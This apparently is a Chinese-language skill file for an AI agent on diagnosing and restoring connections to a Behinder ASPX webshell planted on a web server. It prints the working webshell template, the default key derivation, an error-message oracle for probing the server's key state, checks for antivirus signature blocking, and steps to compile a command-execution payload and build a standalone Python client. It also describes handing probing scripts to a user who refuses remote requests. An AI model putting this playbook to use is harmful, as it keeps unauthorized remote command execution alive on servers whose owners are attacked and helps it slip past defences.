---
name: webshell-connection-diagnosis
description: "诊断webshell连接失败(500解密错误)：冰蝎Behinder ASPX协议、密钥派生、独立客户端。"
version: 1.0.0
metadata:
  hermes:
    tags: [pentest, webshell, behinder, aspx, aes, rijndael, csharp]
---

# Webshell 连接诊断与运维

适用场景：已有 webshell 突然连不上（HTTP 500 / "Padding is invalid" / 客户端报"解密错误"）、
判断马是否存活、客户端配置排查、绕开损坏的客户端自建连接。

## 0. 马还活着吗（第一步必做）
- GET 该 aspx URL：
  - 404 = 文件被清
  - 500 且错误页源码就是马的代码 = **马活着**，只是解密失败
- 加密马对无 body 的 GET 必然 500（空密文 PKCS7 校验失败 = 正常现象），别误判成马死了

## 1. 冰蝎(Behinder) 4.x ASPX 协议（核心）
服务端模板（Behinder 目录 server/shell.aspx，混淆版结构相同）：
```
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","<KEY>"); /*该密钥为连接密码32位md5值的前16位*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
```
- 密钥 = MD5(连接密码).hexdigest()[:16]（16 个 ASCII 字符）；默认密码 rebeyond → e45e329feb5d925b
- 加密 = AES-128-CBC，IV=密钥，PKCS7（RijndaelManaged 默认参数）
- 传输 = 整个 POST body 裸二进制（Content-Type: application/octet-stream），无 base64、无参数
- 载荷 = 编译好的 .NET 程序集，全局命名空间 class U，`CreateInstance("U").Equals(this)` 触发执行（this=Page）
- 混淆版可能带 "Welcome You!" 等前缀文本，不影响协议
- 常见坑：`Session[Convert.ToInt32("0")]` = `Session[0]`（按索引取第一个 Session 项），不是键 "0"
- 客户端默认协议 transProtocolId=-1 = LegacyCryptor = **CBC**；别选 TransProtocol 表里 aspx 的
  default_aes（id=28，那是 ECB+base64 的陷阱协议，选了必解密失败）

## 2. 错误信息 oracle（判断服务端密钥/会话状态）
对裸 body POST，看错误页 Exception Details：
| 报错 | 含义 |
|------|------|
| "Length of the data to decrypt is invalid"（发 15B 非16倍数） | 解密器已跑 = 密钥长度合法(16/24/32) |
| "Specified key is not a valid size" / IV 长度不匹配 | 密钥空/长度不对（Session 无值） |
| "Padding is invalid"（空 body 或错密钥） | 失败态，换密钥再测 |
| "BadImageFormat: Bad IL format" | **解密通过，密钥正确**（载荷不是合法程序集而已） |

⚠️ 验证密钥的陷阱：固定小明文（如 64B 全零）用错误密钥加密，解密结果**偶发恰好通过 PKCS7
校验（~0.02%）**，会误报"错误密钥也对"。判定密钥必须用真实载荷（编译的 DLL）复测，
不能只信小明文测试。

## 3. 客户端对不上时，按序排除干扰
1. 大小阈值：POST 9KB 全零密文 → BadImageFormat=无限制；Padding=有 body 过滤
2. 多 worker/轮询：重复 GET 对比错误页源码特征段 + DNS 多 A 记录
3. 杀软签名：发冰蝎 jar 原版载荷（payload/csharp/Cmd.dll 本身是合法 .NET 程序集）→ Padding=签名拦
4. 本地代理：requests 走 127.0.0.1:7890(Clash) 复测同一请求
5. 客户端条目配置（见下）

## 4. 冰蝎客户端侧排查
- data.db（SQLite）在 Behinder 目录：shells 表（url/ip/password/type/transProtocolId，标准应为 -1）、
  proxys 表（常指向已死的 neoreg 127.0.0.1:1080 或 Clash 7890）、TransProtocol 表（含 ECB 陷阱协议）
- 改 db：先备份，**必须完全退出冰蝎（javaw 进程）再改**，否则退出时被覆盖
- 条目缺失很常见（用户现加不保存）——直接 INSERT 标准条目（transProtocolId=-1）最省事
- 客户端 jar 反编译要点：net/rebeyond/behinder/core/ 下 Crypt（ECB+CBC 两套实现）、
  ShellService.getCryptor()（LegacyCryptor=默认 / CustomCryptor=自定义）、Constants（内嵌 C# 模板）

## 5. 自建独立客户端（绕开损坏客户端）
1. 编译 U.dll：`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:library /out:U.dll U.cs`
   - U.cs 用反射拿 Page 的 Response/Request（免 System.Web 编译引用），见 templates/U.cs
   - git-bash 里调 csc.exe：先 cd 到目标目录用相对路径（原生工具不吃 /c/ 正斜杠路径）
2. Python 驱动：AES-128-CBC(IV=key) 加密 U.dll → POST `URL?cmd=<命令>`，body=裸密文，
   见 templates/behinder_client.py
3. 验证判读：HTTP 200 + 输出 = 通；500 Padding = 密钥/协议不对；500 BadImageFormat = 载荷格式问题

## 6. 本机 .NET 真值测试
RijndaelManaged 各场景报错（空密钥/短密钥/错密钥/空数据）不确定时，用 csc.exe 编译小控制台
逐个打异常消息，别靠猜。中文 locale 下报错消息是中文（"数据无效无法移除填充" 等）。

## 工作流偏好（重要）
- 远程探测请求用户可能连续拒绝——把验证脚本写好（自包含、注释里写清判读方法），
  让用户自己跑并贴输出，比自己反复发请求顺得多
- 改本地工具配置（冰蝎 data.db 等）前先备份并说明影响，改完提醒用户重启工具

## 陷阱速查
- csc.exe/原生 Windows 工具在 git-bash：反斜杠路径或 cd 相对路径，否则 MSYS 转换搞坏
- 判定"密钥正确"必须 BadImageFormat/执行成功；Padding 一律视为不匹配
- 冰蝎 default_aes(aspx) 协议是 ECB+base64，与标准马(CBC+裸二进制)不兼容
- 服务器响应无 Set-Cookie 是常见现象（会话没写入不一定会发 cookie），别据此判断会话坏了

## 支持文件
- templates/U.cs — 反射式命令执行载荷（编译为 U.dll）
- templates/behinder_client.py — 通用冰蝎马 Python 客户端
- references/usc_rec-20260809.md — USCREC 实战排查实录（oracle 测试矩阵、jar 内部结构、结论）
